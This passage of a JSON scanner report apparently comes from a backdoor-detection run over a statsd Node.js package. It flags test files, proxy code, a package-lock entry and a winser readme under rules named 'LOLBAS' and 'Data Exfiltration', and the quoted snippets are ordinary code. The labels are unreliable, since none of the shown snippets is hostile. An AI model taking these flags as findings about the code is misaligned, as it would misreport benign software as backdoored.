                      "markdown": "`  server.on('connection',collector);\n};\n\n// A python script that converts from the graphite pickle-based \n// wire protocol into JSON written to stdout.\nvar script =\n  \"import sys\\n\" +\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/graphite_pickle_tests.js"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 41,
                  "endLine": 35,
                  "endColumn": 50,
                  "snippet": {
                    "text": "  });\n};\n\n// keep collecting data until a specified timeout period has elapsed\n// this will let us capture all data chunks so we don't miss one\nvar collect_for = function(server,timeout,cb){\n  // We have binary data arriving over the wire. Avoid strings.\n",
                    "rendered": {
                      "text": "  });\n};\n\n// keep collecting data until a specified timeout period has elapsed\n// this will let us capture all data chunks so we don't miss one\nvar collect_for = function(server,timeout,cb){\n  // We have binary data arriving over the wire. Avoid strings.\n",
                      "markdown": "`  });\n};\n\n// keep collecting data until a specified timeout period has elapsed\n// this will let us capture all data chunks so we don't miss one\nvar collect_for = function(server,timeout,cb){\n  // We have binary data arriving over the wire. Avoid strings.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/graphite_pickle_tests.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 3,
                  "endLine": 4,
                  "endColumn": 7,
                  "snippet": {
                    "text": "var fs           = require('fs'),\n    net          = require('net'),\n    temp         = require('temp'),\n    cp           = require('child_process'),\n    util          = require('util'),\n    urlparse     = require('url').parse,\n    _            = require('underscore'),\n",
                    "rendered": {
                      "text": "var fs           = require('fs'),\n    net          = require('net'),\n    temp         = require('temp'),\n    cp           = require('child_process'),\n    util          = require('util'),\n    urlparse     = require('url').parse,\n    _            = require('underscore'),\n",
                      "markdown": "`var fs           = require('fs'),\n    net          = require('net'),\n    temp         = require('temp'),\n    cp           = require('child_process'),\n    util          = require('util'),\n    urlparse     = require('url').parse,\n    _            = require('underscore'),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/run_tests.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 23,
                  "endLine": 7,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    reporter = require('nodeunit').reporters.default;\n}\ncatch(e) {\n    console.log(\"Cannot find nodeunit module.\");\n    console.log(\"Make sure to run 'npm install nodeunit'\");\n    process.exit();\n}\n",
                    "rendered": {
                      "text": "    reporter = require('nodeunit').reporters.default;\n}\ncatch(e) {\n    console.log(\"Cannot find nodeunit module.\");\n    console.log(\"Make sure to run 'npm install nodeunit'\");\n    process.exit();\n}\n",
                      "markdown": "`    reporter = require('nodeunit').reporters.default;\n}\ncatch(e) {\n    console.log(\"Cannot find nodeunit module.\");\n    console.log(\"Make sure to run 'npm install nodeunit'\");\n    process.exit();\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/run_tests.js"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env node\nlet reporter;\ntry {\n    reporter = require('nodeunit').reporters.default;\n}\n",
                    "rendered": {
                      "text": "#!/usr/bin/env node\nlet reporter;\ntry {\n    reporter = require('nodeunit').reporters.default;\n}\n",
                      "markdown": "`#!/usr/bin/env node\nlet reporter;\ntry {\n    reporter = require('nodeunit').reporters.default;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/proxy.js"
                },
                "region": {
                  "startLine": 296,
                  "startColumn": 40,
                  "endLine": 296,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      }\n\n      if (e.code !== 'ECONNREFUSED' && e.code !== 'EHOSTUNREACH' && e.code !== 'ECONNRESET') {\n        log('Error during healthcheck on node ' + node_id + ' with ' + e.code, 'ERROR');\n      }\n\n      markNodeAsUnhealthy(node_id);\n",
                    "rendered": {
                      "text": "      }\n\n      if (e.code !== 'ECONNREFUSED' && e.code !== 'EHOSTUNREACH' && e.code !== 'ECONNRESET') {\n        log('Error during healthcheck on node ' + node_id + ' with ' + e.code, 'ERROR');\n      }\n\n      markNodeAsUnhealthy(node_id);\n",
                      "markdown": "`      }\n\n      if (e.code !== 'ECONNREFUSED' && e.code !== 'EHOSTUNREACH' && e.code !== 'ECONNRESET') {\n        log('Error during healthcheck on node ' + node_id + ' with ' + e.code, 'ERROR');\n      }\n\n      markNodeAsUnhealthy(node_id);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/proxy.js"
                },
                "region": {
                  "startLine": 249,
                  "startColumn": 19,
                  "endLine": 249,
                  "endColumn": 25,
                  "snippet": {
                    "text": "      node_status[node_id]++;\n    }\n    if (node_status[node_id] < 2) {\n      log('Removing node ' + node_id + ' from the ring.', 'WARNING');\n      ring.remove(node_id);\n    }\n  }\n",
                    "rendered": {
                      "text": "      node_status[node_id]++;\n    }\n    if (node_status[node_id] < 2) {\n      log('Removing node ' + node_id + ' from the ring.', 'WARNING');\n      ring.remove(node_id);\n    }\n  }\n",
                      "markdown": "`      node_status[node_id]++;\n    }\n    if (node_status[node_id] < 2) {\n      log('Removing node ' + node_id + ' from the ring.', 'WARNING');\n      ring.remove(node_id);\n    }\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/proxy.js"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 19,
                  "endLine": 234,
                  "endColumn": 25,
                  "snippet": {
                    "text": "      if (node_status[node_id] > 0) {\n        var new_server = {};\n        new_server[node_id] = 100;\n        log('Adding node ' + node_id + ' to the ring.', 'WARNING');\n        ring.add(new_server);\n      }\n    }\n",
                    "rendered": {
                      "text": "      if (node_status[node_id] > 0) {\n        var new_server = {};\n        new_server[node_id] = 100;\n        log('Adding node ' + node_id + ' to the ring.', 'WARNING');\n        ring.add(new_server);\n      }\n    }\n",
                      "markdown": "`      if (node_status[node_id] > 0) {\n        var new_server = {};\n        new_server[node_id] = 100;\n        log('Adding node ' + node_id + ' to the ring.', 'WARNING');\n        ring.add(new_server);\n      }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/proxy.js"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 28,
                  "endLine": 143,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    // Listen for the send message, and process the metric key and msg\n    packet.on('send', function(key, msg) {\n      // retrieves the destination for this key\n      var statsd_host = ring.get(key);\n\n      // break the retrieved host to pass to the send function\n      if (statsd_host === undefined) {\n",
                    "rendered": {
                      "text": "    // Listen for the send message, and process the metric key and msg\n    packet.on('send', function(key, msg) {\n      // retrieves the destination for this key\n      var statsd_host = ring.get(key);\n\n      // break the retrieved host to pass to the send function\n      if (statsd_host === undefined) {\n",
                      "markdown": "`    // Listen for the send message, and process the metric key and msg\n    packet.on('send', function(key, msg) {\n      // retrieves the destination for this key\n      var statsd_host = ring.get(key);\n\n      // break the retrieved host to pass to the send function\n      if (statsd_host === undefined) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/package-lock.json"
                },
                "region": {
                  "startLine": 1474,
                  "startColumn": 78,
                  "endLine": 1474,
                  "endColumn": 86,
                  "snippet": {
                    "text": "      \"version\": \"0.5.1\",\n      \"resolved\": \"https://registry.npmjs.org/mkdirp/-/mkdirp-0.5.1.tgz\",\n      \"integrity\": \"sha1-MAV0OOrGz3+MR2fzhkjWaX11yQM=\",\n      \"deprecated\": \"Legacy versions of mkdirp are no longer supported. Please update to mkdirp 1.x. (Note that the API surface has changed to use Promises in 1.x.)\",\n      \"dev\": true,\n      \"dependencies\": {\n        \"minimist\": \"0.0.8\"\n",
                    "rendered": {
                      "text": "      \"version\": \"0.5.1\",\n      \"resolved\": \"https://registry.npmjs.org/mkdirp/-/mkdirp-0.5.1.tgz\",\n      \"integrity\": \"sha1-MAV0OOrGz3+MR2fzhkjWaX11yQM=\",\n      \"deprecated\": \"Legacy versions of mkdirp are no longer supported. Please update to mkdirp 1.x. (Note that the API surface has changed to use Promises in 1.x.)\",\n      \"dev\": true,\n      \"dependencies\": {\n        \"minimist\": \"0.0.8\"\n",
                      "markdown": "`      \"version\": \"0.5.1\",\n      \"resolved\": \"https://registry.npmjs.org/mkdirp/-/mkdirp-0.5.1.tgz\",\n      \"integrity\": \"sha1-MAV0OOrGz3+MR2fzhkjWaX11yQM=\",\n      \"deprecated\": \"Legacy versions of mkdirp are no longer supported. Please update to mkdirp 1.x. (Note that the API surface has changed to use Promises in 1.x.)\",\n      \"dev\": true,\n      \"dependencies\": {\n        \"minimist\": \"0.0.8\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 74,
                  "startColumn": 15,
                  "endLine": 74,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\nRemember that the default npm action for \"start\" is \"node server.js\".\n\nThe name of the service will be the same from your package.json \"name\" setting.\n\n## Credits\n\n",
                    "rendered": {
                      "text": "\nRemember that the default npm action for \"start\" is \"node server.js\".\n\nThe name of the service will be the same from your package.json \"name\" setting.\n\n## Credits\n\n",
                      "markdown": "`\nRemember that the default npm action for \"start\" is \"node server.js\".\n\nThe name of the service will be the same from your package.json \"name\" setting.\n\n## Credits\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 157,
                  "endLine": 70,
                  "endColumn": 166,
                  "snippet": {
                    "text": "\n## How it works\n\nWhen you install your node.js program as a windows service, your program is registered using nssm.exe (which is inside the module folder). Once you start the service nssm.exe is run and nssm.exe will execute \"npm start\" of your application.\n\nRemember that the default npm action for \"start\" is \"node server.js\".\n\n",
                    "rendered": {
                      "text": "\n## How it works\n\nWhen you install your node.js program as a windows service, your program is registered using nssm.exe (which is inside the module folder). Once you start the service nssm.exe is run and nssm.exe will execute \"npm start\" of your application.\n\nRemember that the default npm action for \"start\" is \"node server.js\".\n\n",
                      "markdown": "`\n## How it works\n\nWhen you install your node.js program as a windows service, your program is registered using nssm.exe (which is inside the module folder). Once you start the service nssm.exe is run and nssm.exe will execute \"npm start\" of your application.\n\nRemember that the default npm action for \"start\" is \"node server.js\".\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 25,
                  "endLine": 62,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  }\n```\n\nThen you can install your service as:\n\n```bash\n  npm run-script install-windows-service\n",
                    "rendered": {
                      "text": "  }\n```\n\nThen you can install your service as:\n\n```bash\n  npm run-script install-windows-service\n",
                      "markdown": "`  }\n```\n\nThen you can install your service as:\n\n```bash\n  npm run-script install-windows-service\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 47,
                  "startColumn": 15,
                  "endLine": 48,
                  "snippet": {
                    "text": "The arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n-  s silent, don't display any information\n\n\n## Method 2\n",
                    "rendered": {
                      "text": "The arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n-  s silent, don't display any information\n\n\n## Method 2\n",
                      "markdown": "`The arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n-  s silent, don't display any information\n\n\n## Method 2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 13,
                  "endLine": 46,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\nThe arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n-  s silent, don't display any information\n\n",
                    "rendered": {
                      "text": "\nThe arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n-  s silent, don't display any information\n\n",
                      "markdown": "`\nThe arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n-  s silent, don't display any information\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 37,
                  "endLine": 44,
                  "endColumn": 45,
                  "snippet": {
                    "text": "-  s silent, don't display any information\n-  c ask for confirmation. This is very helpfull because during development you don't want to install/uninstall the package as a windows service but you will often run \"npm install\" in the folder, then you can cancel with an 'n'.\n\nThe arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n",
                    "rendered": {
                      "text": "-  s silent, don't display any information\n-  c ask for confirmation. This is very helpfull because during development you don't want to install/uninstall the package as a windows service but you will often run \"npm install\" in the folder, then you can cancel with an 'n'.\n\nThe arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n",
                      "markdown": "`-  s silent, don't display any information\n-  c ask for confirmation. This is very helpfull because during development you don't want to install/uninstall the package as a windows service but you will often run \"npm install\" in the folder, then you can cancel with an 'n'.\n\nThe arguments in the **preuninstall** script means:\n\n-  x stop the service before uninstalling\n-  r remove the service\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 136,
                  "endLine": 42,
                  "endColumn": 145,
                  "snippet": {
                    "text": "\n-  i install\n-  s silent, don't display any information\n-  c ask for confirmation. This is very helpfull because during development you don't want to install/uninstall the package as a windows service but you will often run \"npm install\" in the folder, then you can cancel with an 'n'.\n\nThe arguments in the **preuninstall** script means:\n\n",
                    "rendered": {
                      "text": "\n-  i install\n-  s silent, don't display any information\n-  c ask for confirmation. This is very helpfull because during development you don't want to install/uninstall the package as a windows service but you will often run \"npm install\" in the folder, then you can cancel with an 'n'.\n\nThe arguments in the **preuninstall** script means:\n\n",
                      "markdown": "`\n-  i install\n-  s silent, don't display any information\n-  c ask for confirmation. This is very helpfull because during development you don't want to install/uninstall the package as a windows service but you will often run \"npm install\" in the folder, then you can cancel with an 'n'.\n\nThe arguments in the **preuninstall** script means:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 36,
                  "endLine": 38,
                  "endColumn": 44,
                  "snippet": {
                    "text": "  npm install git://github.com/myprivate/repository/url.git\n```\n\nThe arguments in the **postinstall** script means:\n\n-  i install\n-  s silent, don't display any information\n",
                    "rendered": {
                      "text": "  npm install git://github.com/myprivate/repository/url.git\n```\n\nThe arguments in the **postinstall** script means:\n\n-  i install\n-  s silent, don't display any information\n",
                      "markdown": "`  npm install git://github.com/myprivate/repository/url.git\n```\n\nThe arguments in the **postinstall** script means:\n\n-  i install\n-  s silent, don't display any information\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 27,
                  "endLine": 32,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n```\n\nThen, in order to install a node application in lets say a server I will do this:\n\n```bash\n  npm install git://github.com/myprivate/repository/url.git\n",
                    "rendered": {
                      "text": "  }\n```\n\nThen, in order to install a node application in lets say a server I will do this:\n\n```bash\n  npm install git://github.com/myprivate/repository/url.git\n",
                      "markdown": "`  }\n```\n\nThen, in order to install a node application in lets say a server I will do this:\n\n```bash\n  npm install git://github.com/myprivate/repository/url.git\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 77,
                  "endLine": 18,
                  "endColumn": 86,
                  "snippet": {
                    "text": "    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n\n\n## Method 1\n",
                    "rendered": {
                      "text": "    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n\n\n## Method 1\n",
                      "markdown": "`    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n\n\n## Method 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 35,
                  "endLine": 18,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n\n\n## Method 1\n",
                    "rendered": {
                      "text": "    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n\n\n## Method 1\n",
                      "markdown": "`    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n\n\n## Method 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 32,
                  "endLine": 15,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n",
                    "rendered": {
                      "text": "    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n",
                      "markdown": "`    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n    -p, --path [path]   path to the node application you want to install as a service [current directory]\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 58,
                  "endLine": 14,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n",
                    "rendered": {
                      "text": "    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n",
                      "markdown": "`    -h, --help          output usage information\n    -V, --version       output the version number\n    -i, --install       install the node application as a windows service\n    -r, --remove        remove the windows service for the node application\n    -x, --stop          stop the service before uninstalling\n    -s, --silent        supress any information in the console\n    -c, --confirmation  ask for confirmation before installing/uninstalling\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/winser/readme.md"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
